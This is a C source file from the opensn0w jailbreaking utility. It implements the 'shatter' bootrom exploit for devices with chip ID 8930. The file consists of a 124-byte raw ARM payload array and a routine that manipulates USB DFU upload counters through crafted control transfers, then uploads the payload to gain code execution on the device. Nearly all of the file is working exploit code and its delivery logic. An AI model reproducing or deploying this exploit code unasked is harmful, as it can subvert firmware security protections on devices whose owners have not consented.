/* opensn0w
 * An open-source jailbreaking utility.
 * Brought to you by rms, acfrazier & Maximus
 * Special thanks to iH8sn0w & MuscleNerd
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

#include "sn0w.h"

unsigned char shatter_raw[] = {
	0x12, 0x48, 0x85, 0x46, 0x12, 0x48, 0x13, 0x49, 0x13, 0x4a, 0x03, 0x68,
	0x13, 0x60, 0x04, 0x30, 0x04, 0x32, 0x04, 0x39, 0x00, 0x29, 0xf8, 0xd1,
	0x10, 0x48, 0x40, 0x21, 0x00, 0x22, 0x03, 0x68, 0x13, 0x60, 0x04, 0x30,
	0x04, 0x32, 0x04, 0x39, 0x00, 0x29, 0xf8, 0xd1, 0x0c, 0x4b, 0x98, 0x47,
	0x0c, 0x4b, 0x98, 0x47, 0x0c, 0x4b, 0x98, 0x47, 0x0c, 0x48, 0x0d, 0x49,
	0x0d, 0x4b, 0x98, 0x47, 0x00, 0x20, 0x0a, 0x49, 0x00, 0x22, 0x0c, 0x4b,
	0x98, 0x47, 0xfe, 0xe7, 0x00, 0xb8, 0x02, 0x84, 0x40, 0xf6, 0x02, 0x84,
	0x40, 0x01, 0x00, 0x00, 0x00, 0xc0, 0x02, 0x84, 0x40, 0xf5, 0x02, 0x84,
	0x80, 0x64, 0x00, 0x00, 0xf8, 0x03, 0x00, 0x00, 0x2d, 0x71, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x84, 0x00, 0xc0, 0x02, 0x00, 0x85, 0x4c, 0x00, 0x00,
	0x5d, 0x5a, 0x00, 0x00
};

unsigned int shatter_raw_len = 124;

int shatter()
{
	int ret;
	unsigned char data[0x800];

	if (device->chip_id != 8930) {
		FATAL
		    ("You might as well leave since this exploit is not compatible with your processor\n");
		return -1;
	}

	{
		unsigned int addr = 0x84000000, dwn_addr = 0x84000000;
		unsigned int shift = 0x80;
		unsigned int addr_final;
		uint8_t buf[0x2C000];
		memset(buf, 0, 0x2C000);

		DPRINT("_PASS_1_\n");
		DPRINT("preparing oversize...\n");
		ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 100);
		if (ret < 0) {
			ERR("failed to reset USB counters.\n");
			return 1;
		}

		ret =
		    irecv_control_transfer(client, 0xA1, 2, 0, 0, data, shift,
					   100);
		if (ret < 0) {
			ERR("failed to shift DFU_UPLOAD counter.\n");
			return 1;
		}
		addr += shift;
		irecv_reset(client);

		DPRINT("resetting DFU.\n");
		irecv_finish_transfer(client);
		client = irecv_reconnect(client, 2);
		if (!client) {
			ERR("device stalled.\n");
			return 1;
		}

		uint8_t *pbuf = buf;
		do {
			ret =
			    irecv_control_transfer(client, 0x21, 1, 0, 0, pbuf,
						   0x800, 100);
			dwn_addr += 0x800;
			pbuf += 0x800;
		} while (dwn_addr < 0x8402C000 && ret >= 0);
		if (ret < 0) {
			ERR("failed to upload exploit data.\n");
			return 1;
		}

		addr_final = addr + 0x2C000;
		do {
			ret =
			    irecv_control_transfer(client, 0xA1, 2, 0, 0, data,
						   0x800, 100);
			addr += 0x800;
		} while (addr < addr_final && ret >= 0);
		if (ret < 0) {
			ERR("failed to shift DFU_UPLOAD counter.\n");
			return 1;
		}

		DPRINT("SHA1 registers pointed to 0x0.\n");
	}

	/*ifnot, reinit the context */
	client = irecv_reconnect(client, 2);
	if (!client) {
		DPRINT("Device stalled\n");
		return 1;
	}

	{
		unsigned int addr = 0x84000000, dwn_addr = 0x84000000;
		unsigned int shift = 0x140;
		unsigned int addr_final;
		uint8_t buf[0x2C000];
		memset(buf, 0, 0x2C000);

		DPRINT("_PASS_2_\n");
		DPRINT("preparing oversize...\n");
		ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 100);
		if (ret < 0) {
			ERR("failed to reset USB counters.\n");
			return 1;
		}

		ret =
		    irecv_control_transfer(client, 0xA1, 2, 0, 0, data, shift,
					   100);
		if (ret < 0) {
			ERR("failed to shift DFU_UPLOAD counter.\n");
			return 1;
		}
		addr += shift;
		irecv_reset(client);

		DPRINT("resetting DFU.\n");
		irecv_finish_transfer(client);
		client = irecv_reconnect(client, 2);
		if (!client) {
			ERR("device stalled.\n");
			return 1;
		}

		DPRINT("now uploading exploit.\n");
		memcpy(buf, shatter_raw, shatter_raw_len);

		uint8_t *pbuf = buf;
		do {
			ret =
			    irecv_control_transfer(client, 0x21, 1, 0, 0, pbuf,
						   0x800, 100);
			dwn_addr += 0x800;
			pbuf += 0x800;
		} while (dwn_addr < 0x8402C000 && ret >= 0);
		if (ret < 0) {
			ERR("failed to upload exploit data.");
			return 1;
		}

		addr_final = addr + 0x2C000;
		do {
			ret =
			    irecv_control_transfer(client, 0xA1, 2, 0, 0, data,
						   0x800, 100);
			addr += 0x800;
		} while (addr < addr_final && ret >= 0);
		if (ret < 0) {
			ERR("failed to shift DFU_UPLOAD counter.");
			return 1;
		}

		DPRINT("exploit sent.\n");
	}

	return 0;
}
